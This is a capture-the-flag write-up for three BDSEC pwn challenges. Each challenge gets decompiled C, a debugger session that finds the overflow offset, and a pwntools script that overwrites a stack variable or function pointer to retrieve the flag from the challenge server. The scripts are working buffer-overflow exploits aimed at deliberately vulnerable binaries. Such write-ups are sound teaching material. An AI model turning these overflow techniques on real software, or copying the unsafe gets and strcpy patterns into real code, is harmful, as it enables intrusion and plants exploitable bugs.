# Pwn Challenges

## Ghost

### Description

Find the flag.

> $ nc 139.144.184.150 4000

Attachment: [Link](https://drive.google.com/folderview?id=1EsifRe8yP_tBt8Co3wtOZDHYfo6hlAy8)

### Analysis

After opening file in Ghidra the main function looks like this (I renamed variables):

```c
int main(void) {
  long in_FS_OFFSET;
  char buffer [64];
  int variableToOverwrite;
  char code [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printCatArt();
  puts("Ghostly Haunting: Mysterious Apparitions Spotted in Abandoned Mansion!");
  fflush(stdout);
  variableToOverwrite = 0;
  printf("ghost code: ");
  gets(code);
  strcpy(buffer,code);
  if (variableToOverwrite == 0x44434241) {
    puts("BDSEC{you_need_to_find_flag_in_server!}");
  }
  else {
    puts("You have escaped the ghost!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
} 
```

So there's a variable on the stack and we have to overwrite it somehow. Program get user input, copies it to buffer, and nothing. Input is lost.

Program has all protections enabled, so how to we overwrite the variable?

```bash
└─$ checksec ./ghost     
[*] ''.../BDSEC/ghost/ghost'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Attack Vector: Human error

```c
char buffer [64];
char code [264];
```

As you can see `code` is bigger then `buffer`, meaning we can write on the stack. First we will need offset.

```bash
└─$ gdb -q ./ghost 
pwndbg: loaded 136 pwndbg commands and 48 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from ./ghost...
(No debugging symbols found in ./ghost)
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections ''
pwndbg> disass main
... ... ...
   0x00000000000013a9 <+160>:   cmp    eax,0x44434241
... ... ...
pwndbg> b *main+160
Breakpoint 1 at 0x13a9
pwndbg> !cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
Starting program: /home/kali/Desktop/BDSEC/ghost/ghost 
...                                                                                                           
ghost code: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa                      
                                                                                                                                      
Breakpoint 1, 0x00005555555553a9 in main ()                                                                                           
...
*RIP  0x5555555553a9 (main+160) ◂— cmp eax, 0x44434241
...
pwndbg> p/x $eax
$1 = 0x61616171

pwndbg> !unhex 61616171 # Hex -> Ascii
aaaq

pwndbg> !cyclic -l qaaa # Reversed Because LSB
64 # Offset
```

### Solution

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = './ghost'
elf = context.binary = ELF(exe)
context.log_level = 'INFO' # 'DEBUG'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("139.144.184.150", 4000)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = 64
value = 0x44434241 # Compare Value
payload = flat(
    b"\x90" * offset,
    pack(value)
)
io.recvuntil(b"Mansion!") # Recieve Strings Till "Mansion!"
io.recvline() # Code: ...
io.sendline(payload) # Send Code
info(io.recvline().decode().strip()) # Profit
io.close()
```

```bash
└─$ py solve.py REMOTE 
[+] Opening connection to 139.144.184.150 on port 4000: Done
[*] ghost code: BDSEC{You_have_been_haunted_by_a_ghost!}
[*] Closed connection to 139.144.184.150 port 4000
```
::: tip Flag
`BDSEC{You_have_been_haunted_by_a_ghost!}`
:::

## anyaForger

### Description

Let's see if you can get the flag.

> $ nc 139.144.184.150 31337

**Attachment:** [Link](https://drive.google.com/drive/folders/1uKcJmYIl1VZx2RegkXKDdqWFBihKpx2U?usp=sharing)

### Analysis

Checksec:
```bash
└─$ checksec ./beef  
[*] '.../BDSEC/anyaForger/beef'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```                         

Ghidra code, function vuln:
```c
void vuln(void) {
  char input [32];
  int valueToOverwrite;
  
  valueToOverwrite = 0x12345678;
  printf("Enter the secret word: ");
  fflush(stdout);
  gets(input); // Dangerous `gets`
  if (valueToOverwrite == L'\xdeadbeef') {
    anyaforger(); // Prints Flag
    fflush(stdout);
    return;
  }
  puts("Sorry, that\'s not the secret word.");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Let's find offset.

```bash
└─$ gdb -q ./beef
pwndbg> disass vuln
...
	0x08049269 <+78>:    cmp    DWORD PTR [ebp-0xc],0xdeadbeef
...
pwndbg> b *vuln+78
Breakpoint 1 at 0x8049269
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
...
Enter the secret word: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa           
...
*EIP  0x8049269 (vuln+78) ◂— cmp dword ptr [ebp - 0xc], 0xdeadbeef
...
pwndbg> x/x $ebp - 0xC
0xffffcf6c:     0x61616169 

└─$ unhex 61616169 # Hex -> Ascii
aaai
└─$ cyclic -l iaaa # Reversed Because LSB
32 # Offset
```

### Solution

```py
#!/usr/bin/env python3
from pwn import *

exe = './beef'
elf = context.binary = ELF(exe)
context.log_level = 'INFO' # 'DEBUG'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("139.144.184.150", 31337)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = 32
value = 0xDEADBEEF
payload = flat(
    b"\x90" * offset,
    pack(value)
)
io.recvuntil(b"organization") # Recieve Strings Till 'organization'
io.recvline() # Code: ...
io.sendline(payload) # Send Payload
info(io.recvall().decode().strip()) # Profit
io.close()
```

```bash
└─$ py solve.py REMOTE
[+] Opening connection to 139.144.184.150 on port 31337: Done
[+] Receiving all data: Done (82B)
[*] Closed connection to 139.144.184.150 port 31337
[*] Enter the secret word: BDSEC{artificial_intelligence_guides_us_to_a_better_future}
```
::: tip Flag
`BDSEC{artificial_intelligence_guides_us_to_a_better_future}`
:::

## callme

### Description

Call me & get the flag.

> $ nc 139.144.184.150 3333

**Attachment:** [Link](https://drive.google.com/drive/folders/1NC8iqz1B4ZaVO1owBm-PJIt298StQdPY?usp=sharing)

### Analysis

Checksec:

```bash
└─$ checksec ./callme 
[*] '.../BDSEC/callme/callme'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

From Ghidra, main function:

```c
void main(void) {
  undefined local_54 [64];
  code *local_14;
  undefined *puStack_10;
  
  puStack_10 = &stack0x00000004;
  funcionToCall = (code *)0x0;
  printDogArt();
  fflush(stdout);
  puts("who let the dogs out:");
  fflush(stdout);
  __isoc99_scanf(&DAT_08048a94,local_54);
  if (funcionToCall == (code *)0x0) { // If 'funcionToCall' Is Null
    puts("I tell the fellas start the name calling!");
  } else { 
    printf("Well, the party was nice, the party was  @ %p\n",local_14); // Debug
    fflush(stdout);
    (*funcionToCall)(); // Call Function At Address 'funcionToCall'
  }
  exit(0);
}
```

There's function `callme` which we will need to call to get the flag!

Let's open it up in gdb and start taking some notes.

```bash
└─$ gdb -q ./callme 
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
...
0x0804875e  callme # Function To Call
0x0804878c  main 
...
pwndbg> disass main
...
   0x08048808 <+124>:   test   eax,eax # Check Value Of `functionToCall`
... 
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
...
who let the dogs out:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
*EIP  0x8048808 (main+124) ◂— test eax, eax
...
pwndbg> p/x $eax # Check Value Of `functionToCall`
$1 = 0x61616171

└─$ unhex 61616171 # Hex -> Ascii
aaaq                                                                                                                                                                                                                  

└─$ cyclic -l qaaa # Reversed Because Of LSB
64 # Offset
```

### Solution

```py
#!/usr/bin/env python3
from pwn import *

exe = './callme'
elf = context.binary = ELF(exe)
context.log_level = 'INFO' # 'DEBUG'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("139.144.184.150", 3333)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = 64
payload = flat({offset: elf.functions.callme}) # Craft Payload
io.recvuntil(b"out:\n") # Recieve Until Input
io.sendline(payload) # Send Payload
io.recvline() # Discard Extra Output
info(io.recvline().decode().strip()) # Profit
io.close()
```

```bash
└─$ py solve.py REMOTE                                               
[+] Opening connection to 139.144.184.150 on port 3333: Done
[*] BDSEC{reverse_engineering_shatters_the_chains_of_ignorance}
[*] Closed connection to 139.144.184.150 port 3333
```
::: tip Flag
`BDSEC{reverse_engineering_shatters_the_chains_of_ignorance}`
:::